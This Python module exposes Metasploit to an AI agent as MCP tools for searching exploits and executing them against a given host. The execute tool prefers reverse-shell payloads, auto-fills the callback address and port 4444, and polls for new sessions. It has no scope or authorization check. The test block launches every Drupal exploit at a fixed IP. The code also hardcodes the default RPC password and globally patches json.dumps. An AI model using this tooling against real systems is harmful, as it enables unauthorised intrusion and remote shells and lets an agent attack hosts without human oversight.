#!/usr/bin/env python3
"""
Metasploit Scanner Module for Red Team MCP

This module provides Metasploit framework integration for exploit discovery and execution.
Uses pymetasploit3 library to communicate with Metasploit RPC server.
"""

import json
import uuid
from datetime import datetime
from pprint import pprint
from typing import Annotated, Dict, List, Optional, Any
import logging

from red_team_mcp import database
import socket

logger = logging.getLogger(__name__)

# Global Metasploit client - will be initialized when needed
_msf_client = None

def convert_int_keys_to_str(obj):
    """
    Recursively convert integer keys to strings, ObjectIds to strings, and datetime objects to ISO strings
    in dictionaries to avoid JSON serialization errors.
    This is needed because Metasploit RPC can return data with integer keys, MongoDB returns ObjectIds,
    and database queries can return datetime objects.
    """
    from datetime import datetime

    # Handle ObjectId conversion
    if hasattr(obj, '__class__') and obj.__class__.__name__ == 'ObjectId':
        return str(obj)
    # Handle datetime conversion
    elif isinstance(obj, datetime):
        return obj.isoformat()
    elif isinstance(obj, dict):
        result = {}
        for k, v in obj.items():
            # Convert ObjectId keys to strings
            if hasattr(k, '__class__') and k.__class__.__name__ == 'ObjectId':
                key_str = str(k)
            else:
                key_str = str(k)
            result[key_str] = convert_int_keys_to_str(v)
        return result
    elif isinstance(obj, list):
        return [convert_int_keys_to_str(item) for item in obj]
    else:
        return obj

def format_tool_response(success: bool, data: Dict[str, Any], error: str = "") -> str:
    """Format tool response in consistent JSON format."""
    response = {
        "success": success,
        "timestamp": datetime.now().isoformat(),
        **data
    }
    if error:
        response["error"] = error

    # Convert any integer keys to strings to avoid JSON serialization errors
    response = convert_int_keys_to_str(response)

    return json.dumps(response, indent=2)

def get_metasploit_client():
    """Get or create Metasploit RPC client connection."""
    global _msf_client

    if _msf_client is None:
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
            import json

            # Try to patch msgpack which is used by pymetasploit3
            try:
                import msgpack

                # Store original packb function
                original_packb = msgpack.packb

                def patched_packb(obj, **kwargs):
                    """Patched msgpack.packb that converts integer keys to strings."""
                    try:
                        # Convert integer keys before packing
                        converted_obj = convert_int_keys_to_str(obj)
                        return original_packb(converted_obj, **kwargs)
                    except Exception:
                        # Fallback to original if conversion fails
                        return original_packb(obj, **kwargs)

                # Apply the msgpack patch
                msgpack.packb = patched_packb
                print("🔧 DEBUG: Applied msgpack patch for integer keys")

            except ImportError:
                print("⚠️  DEBUG: msgpack not available for patching")

            # Also patch json.dumps as a backup
            original_dumps = json.dumps

            def patched_dumps(obj, **kwargs):
                """Patched json.dumps that converts integer keys to strings."""
                try:
                    # Try the original dumps first
                    return original_dumps(obj, **kwargs)
                except TypeError as e:
                    if "int is not allowed for map key" in str(e) or "keys must be a string" in str(e):
                        # Convert integer keys to strings and try again
                        converted_obj = convert_int_keys_to_str(obj)
                        return original_dumps(converted_obj, **kwargs)
                    else:
                        raise

            # Apply the json patch
            json.dumps = patched_dumps
            print("🔧 DEBUG: Applied JSON patch for integer keys")

            # Default connection parameters - can be made configurable later
            password = "msf"  # Default msfrpcd password
            host = "127.0.0.1"
            port = 55553  # Default msfrpcd port
            ssl = True  # msfrpcd runs with SSL by default

            _msf_client = MsfRpcClient(password, host=host, port=port, ssl=ssl)
            logger.info(f"Connected to Metasploit RPC server at {host}:{port}")

        except ImportError:
            raise Exception("pymetasploit3 library not installed. Install with: pip install pymetasploit3")
        except Exception as e:
            raise Exception(f"Failed to connect to Metasploit RPC server: {str(e)}. "
                          "Make sure msfrpcd is running with: msfrpcd -P msf -a 127.0.0.1")

    return _msf_client

def list_exploits_internal(
    platform: str = "",
    search_term: str = "",
    cve: str = "",
    limit: int = 50
) -> Dict[str, Any]:
    """
    List available Metasploit exploits with optional filtering.

    Args:
        platform: Filter by platform (e.g., 'windows', 'linux', 'unix') leave blank for all platforms
        search_term: Search term to filter exploits
        cve: CVE to filter exploits
        limit: Maximum number of exploits to return

    Returns:
        Dictionary with exploit list and metadata
    """
    try:
        scan_id = str(uuid.uuid4())
        start_time = datetime.now()

        # Create initial scan record

        print(f"🚀 DEBUG: Listing exploits using fast database search - platform='{platform}', search='{search_term}', limit={limit}, cve={cve}")

        db_result = database.search_exploits_database(
            platform=platform or None,
            search_term=search_term or None,
            cve=cve or None,  # CVE search is handled in search_term
            limit=limit
        )

        if not len(db_result['exploits']):
            db_result = database.search_exploits_database(
                platform=None,
                search_term=search_term or None,
                cve=cve or None,  # CVE search is handled in search_term
                limit=limit
            )


        if not db_result["success"]:
            raise Exception(f"Database search failed: {db_result.get('error', 'Unknown error')}")

        # Convert database results to the expected format
        filtered_exploits = []
        for exploit in db_result["exploits"]:
            exploit_info = {
                "name": exploit.get("name", ""),
                "description": exploit.get("description", ""),
                "rank": exploit.get("rank", "Unknown"),
                "author": exploit.get("author", "Unknown"),
                "disclosure_date": exploit.get("disclosure_date"),
                "platform": exploit.get("platform", ""),
                "targets": exploit.get("targets", []),
                "required_options": exploit.get("required_options", []),
                "all_options": exploit.get("all_options", []),
                "references": exploit.get("references", []),
                "cves": exploit.get("cve_references", []),
                "compatible_payloads": exploit.get("compatible_payloads", []),
                "payload_constraints": exploit.get("payload_constraints", []),
                "data_source": exploit.get("data_source", "database")
            }
            filtered_exploits.append(exploit_info)

        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds()

        # Store results in database
        results_json = json.dumps({
            "exploits": filtered_exploits,
            "filters": {
                "platform": platform,
                "search_term": search_term,
                "limit": limit
            }
        })

        database.update_scan_status(
            scan_id,
            "completed",
            end_time,
            duration,
            1,
            len(filtered_exploits),
            results_json
        )

        print(f"🎯 DEBUG: Found {len(filtered_exploits)} exploits using fast database search (took {duration:.2f}s)")

        return {
            "success": True,
            "scan_id": scan_id,
            "filtered_exploits": len(filtered_exploits),
            "exploits": filtered_exploits,
            "filters_applied": {
                "platform": platform or "none",
                "search_term": search_term or "none",
                "limit": limit
            },
            "duration_seconds": duration,
            "message": f"Found {len(filtered_exploits)} exploits matching criteria (fast database search)",
            "search_method": "database"
        }

    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "scan_id": scan_id if 'scan_id' in locals() else None
        }


def execute_exploit_internal(
    exploit_name: str,
    target_host: str,
    target_port: int = None,
    payload: str = "",
) -> Dict[str, Any]:
    """
    Execute a Metasploit exploit against a target.

    Args:
        exploit_name: Name of the exploit module to use
        target_host: Target host IP or hostname
        target_port: Target port (if required by exploit)
        payload: Payload to use (if not specified, will use default)
        exploit_options: Additional exploit options as key-value pairs
        payload_options: Additional payload options as key-value pairs

    Returns:
        Dictionary with execution results
    """
    try:
        scan_id = str(uuid.uuid4())
        start_time = datetime.now()
  # Get Metasploit client

        client = get_metasploit_client()
        # Create initial scan record

        print(f"🚀 DEBUG: Executing exploit {exploit_name} against {target_host}:{target_port}")


        try:
            exploit = client.modules.use('exploit', exploit_name)
            if not exploit:
                raise Exception(f"Failed to load exploit module: {exploit_name}")
        except Exception as module_error:
            print(f"❌ DEBUG: Error loading exploit module: {module_error}")
            # Check if it's the integer key error
            if "int is not allowed for map key" in str(module_error):
                print(f"🔧 DEBUG: Detected integer key error in module loading")
                # Try to work around this by catching and re-raising with more context
                raise Exception(f"Metasploit module loading failed due to integer key serialization issue. This is a known issue with the pymetasploit3 library when strict_map_key=True is set in MongoDB. Error: {module_error}")
            else:
                raise module_error

        # Set target host
        exploit['RHOSTS'] = target_host

        # Set target port if provided
        if target_port:
            exploit['RPORT'] = target_port

        # Set additional exploit options

        # Determine payload
        if not payload:
            # Get available payloads and use the first one
            available_payloads = exploit.targetpayloads()
            if available_payloads:
                # find the first reverse
                reverse_payloads = [payload for payload in available_payloads if 'reverse' in payload]
                if reverse_payloads:
                    payload = reverse_payloads[0]
                    print(f"🎯 DEBUG: Using default payload: {payload}")
                else:
                    print(f"DEBUG: No reverse payload found for {exploit_name}")

            else:
                raise Exception("No compatible payloads found for this exploit")

        # Load payload if specified
        payload_obj = None
        if payload:
            payload_obj = client.modules.use('payload', payload)
            if payload_obj:


                if "LHOST" not in payload_obj:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.connect(("8.8.8.8", 80))
                        local_ip = s.getsockname()[0]
                        s.close()
                        payload_obj["LHOST"] = local_ip
                        print(f"🔧 DEBUG: Auto-detected fallback LHOST = {local_ip}")
                    except Exception as e:
                        print(f"⚠️  DEBUG: LHOST not set and auto-detect failed — reverse shell may fail: {e}")
                if "LPORT" not in payload_obj:
                    payload_obj["LPORT"] = "4444"
                    print("🔧 DEBUG: Set payload fallback LPORT = 4444")

                print(f"📡 DEBUG: Handler should now be listening on {payload_obj['LHOST'] if 'LHOST' in payload_obj else 'unknown'}:{payload_obj['LPORT'] if 'LPORT' in payload_obj else 'unknown'}")

        # Check for missing required options
        missing_options = exploit.missing_required
        if missing_options:
            raise Exception(f"Missing required exploit options: {missing_options}")

        # Optional: Run the check method to see if target is likely vulnerable
        try:
            print("🔍 DEBUG: Running vulnerability check...")
            check_result = exploit.check() if callable(exploit.check) else exploit.check
            print(f"✅ DEBUG: Check result: {check_result}")
        except Exception as check_error:
            print(f"⚠️  DEBUG: Check failed: {check_error}")
            check_result = f"Check failed: {str(check_error)}"

        # Execute the exploit
        print(f"🚀 DEBUG: Launching exploit...")
        result = exploit.execute(payload=payload_obj if payload_obj else payload)
        # Wait for new session
        print("⏳ DEBUG: Waiting for session to connect...")
        max_wait = 10  # seconds
        poll_interval = 1
        initial_sessions = set(client.sessions.list.keys())

        import time
        for i in range(max_wait):
            time.sleep(poll_interval)
            current_sessions = set(client.sessions.list.keys())
            new_sessions = current_sessions - initial_sessions
            if new_sessions:
                print(f"✅ DEBUG: New session(s) detected: {new_sessions}")
                break
        else:
            print("⌛ DEBUG: No new session after waiting.")
        print(f"<UNK> result: {result}")

        # Convert result to handle integer keys immediately
        result = convert_int_keys_to_str(result) if result else {}
        print(f"🔧 DEBUG: Exploit execution result: {result}")

        # Check execution result
        job_id = result.get('job_id')
        exploit_uuid = result.get('uuid')

        success = job_id is not None

        # Check for sessions created - handle potential integer keys
        try:
            sessions_raw = client.sessions.list
            sessions = convert_int_keys_to_str(sessions_raw) if sessions_raw else {}
            session_count = len(sessions) if sessions else 0
            print(f"🔧 DEBUG: Sessions found: {session_count}")
        except Exception as session_error:
            print(f"⚠️  DEBUG: Error getting sessions: {session_error}")
            sessions = {}
            session_count = 0

        # Compute vulnerable field
        vulnerable = bool(
            session_count > 0
            or (isinstance(check_result, str) and "vulnerable" in check_result.lower())
            or check_result is True
        )

        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds()

        # Prepare results
        execution_results = {
            "exploit_name": exploit_name,
            "target_host": target_host,
            "target_port": target_port,
            "payload": payload,
            "job_id": job_id,
            "exploit_uuid": exploit_uuid,
            "sessions_created": session_count,
            "sessions": sessions,
            "execution_result": result,
            "check_result": check_result,
            "vulnerable": vulnerable,
        }

        # Convert integer keys to strings to avoid JSON serialization errors
        execution_results = convert_int_keys_to_str(execution_results)
        results_json = json.dumps(execution_results)

        # Update scan record
        database.update_scan_status(
            scan_id,
            "completed" if success else "failed",
            end_time,
            duration,
            1,
            session_count,
            results_json,
            "" if success else f"Exploit execution failed: {result}"
        )

        print(f"💾 DEBUG: Exploit execution completed - Job ID: {job_id}, Sessions: {session_count}")

        result_dict = {
            "success": success,
            "scan_id": scan_id,
            "exploit_name": exploit_name,
            "target_host": target_host,
            "target_port": target_port,
            "payload": payload,
            "job_id": job_id,
            "exploit_uuid": exploit_uuid,
            "sessions_created": session_count,
            "sessions": sessions,
            "duration_seconds": duration,
            "message": f"Exploit executed against {target_host}:{target_port} - Job ID: {job_id}, Sessions created: {session_count}",
            "check_result": check_result,
            "vulnerable": vulnerable,
        }

        # Convert integer keys to strings to avoid JSON serialization errors
        return convert_int_keys_to_str(result_dict)

    except Exception as e:
        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds() if 'start_time' in locals() else 0

        # Update scan record with error if scan_id exists
        if 'scan_id' in locals():
            database.update_scan_status(
                scan_id,
                "failed",
                end_time,
                duration,
                0,
                0,
                "",
                str(e)
            )

        return {
            "success": False,
            "error": str(e),
            "scan_id": scan_id if 'scan_id' in locals() else None,
            "exploit_name": exploit_name,
            "target_host": target_host
        }

def register_tools(app):
    """Register all Metasploit tools with the FastMCP app."""

    @app.tool()
    async def search_exploits(
        platform: Annotated[str, "Filter by platform (e.g., 'windows', 'linux', 'unix'). Leave empty for all platforms."] = "",
        search_term: Annotated[str, "Search term to filter exploits by name or description. Leave empty for no filtering."] = "",
        cve: Annotated[str, "Search for specific CVE reference (e.g., 'CVE-2017-0144'). Leave empty for no CVE filtering."] = "",
        limit: Annotated[int, "Maximum number of exploits to return"] = 50
    ) -> str:
        """
        Search the cached exploits database for fast results.

        This tool searches a pre-populated database of Metasploit exploits for extremely fast results.
        The database contains detailed information including CVE references, author, disclosure dates, etc.

        Use this tool when you want to:
        - Quickly find exploits by platform, service, or vulnerability
        - Search for exploits by CVE number
        - Filter exploits by rank or author
        - Get fast results without querying Metasploit RPC

        Note: The exploits database must be populated first using the populate_exploits.py script.

        Examples:
        - Drupal exploits: search_term='drupal'
        - Windows SMB exploits: platform='windows', search_term='smb'
        - EternalBlue exploit: cve='CVE-2017-0144'
        - High-quality exploits: rank='excellent'

        """
        # Run the blocking database operation in a thread pool
        import asyncio
        result = await asyncio.to_thread(
            database.search_exploits_database,
            platform=platform or None,
            search_term=search_term or None,
            cve=cve or None,
            limit=limit
        )
        # Convert any datetime objects to strings to avoid JSON serialization errors
        result = convert_int_keys_to_str(result)
        print(f"Search Exploit res: {result}")
        return format_tool_response(result["success"], result, result.get("error", ""))

    @app.tool()
    async def execute_exploit(
        exploit_name: Annotated[str, "Name of the exploit module to use (e.g., 'unix/ftp/vsftpd_234_backdoor')"],
        target_host: Annotated[str, "Target host IP address or hostname"],
        target_port: Annotated[int, "Target port number (if required by the exploit)"] = None,
        payload: Annotated[str, "Payload to use (leave empty for default payload)"] = "",
    ) -> str:
        """
        Execute a Metasploit exploit against a target host.

        This tool loads and executes a specific Metasploit exploit module against a target.
        It handles payload selection, option configuration, and session management.

        Use this tool when you want to:
        - Execute known exploits against vulnerable targets
        - Test exploit effectiveness in controlled environments
        - Gain access to target systems for further testing

        Examples:
        - Basic exploit: exploit_name='unix/ftp/vsftpd_234_backdoor', target_host='192.168.1.100'
        - Custom payload: exploit_name='linux/http/apache_mod_cgi_bash_env_exec', target_host='web.example.com', payload='linux/x86/meterpreter/reverse_tcp'
        """

        # Run the blocking execute_exploit_internal function in a thread pool
        import asyncio
        result = await asyncio.to_thread(
            execute_exploit_internal,
            exploit_name, target_host, target_port, payload
        )
        return format_tool_response(result["success"], result, result.get("error", ""))

if __name__ == "__main__":
    # Test the tools directly
    #pprint(list_exploits_internal(cve="CVE-2018-7600"))
    res = list_exploits_internal(search_term="Drupal")

    for exploit in res.get("exploits", []):
        print(exploit)
        res = execute_exploit_internal(exploit.get("name"), '10.0.0.224', 8080)
        print(res)
    # res = execute_exploit_internal('unix/webapp/drupal_drupalgeddon2',
    #                                '10.0.0.224',
    #                                8080
    #
    #                                )
    # print(res)
